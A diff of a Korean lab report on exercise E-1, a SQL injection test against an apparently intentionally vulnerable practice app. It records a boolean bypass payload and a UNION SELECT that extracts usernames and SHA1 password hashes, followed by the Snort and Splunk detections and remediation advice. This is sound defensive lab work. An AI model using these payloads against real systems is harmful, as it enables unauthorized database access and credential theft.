@@ -219,8 +219,31 @@ ET WEB_SERVER WEB-PHP phpinfo access
 
 - Snort 예상 탐지: ET WEB_SERVER SQL Injection Attempt
 
-**결과:**
-> (실습 후 결과 기록)
+**결과:** ✅ (2026-08-04 09:29 KST)
+
+**공격 페이로드 & 결과:**
+- Boolean SQLi: `' OR '1'='1` → 검색 결과에 **전체 영화 목록** 반환 (쿼리 구조 변조 확인)
+- UNION 데이터 추출: `' UNION SELECT 1,login,password,4,5,6,7 FROM users-- -`
+  → users 테이블 **계정·비밀번호 해시 유출**:
+  ```
+  A.I.M.  6885858486f31043e5839c735d99457f045affd0
+  bee     6885858486f31043e5839c735d99457f045affd0
+  foo     0beec7b5ea3f0fdbc95d0dd47f3c5bc275da8a33
+  ```
+  (SHA1 해시 — 예: `6885...affd0` = "bug")
+
+**Snort 탐지 성공** (Splunk `index=pfsense 10.50.50.17`, 4건):
+```
+ET WEB_SERVER SELECT USER SQL Injection Attempt in URI  [Web Application Attack, P1]  10.50.50.17 -> 10.0.0.254:80
+ET WEB_SERVER SQL Errors in HTTP 200 Response (error in your SQL syntax)  [P2]  10.0.0.254:80 -> 10.50.50.17
+```
+- 공격 요청(SQLi in URI) + 서버 응답의 SQL 에러 노출까지 **양방향 탐지**
+- 컨설팅 관점: 인증우회·전체 DB 유출 → **V-01 SQL Injection (Critical)**. 개선: Prepared Statement·입력검증·에러 숨김·DB 최소권한
+
+**스크린샷:**
+
+![E-1 SQLi UNION 데이터 추출](images/E-1-sqli.png)
+![E-1 Snort SQLi 탐지 (Splunk)](images/E-1-snort-splunk.png)
 
 ### E-2. SQL Injection (sqlmap 자동화)
 
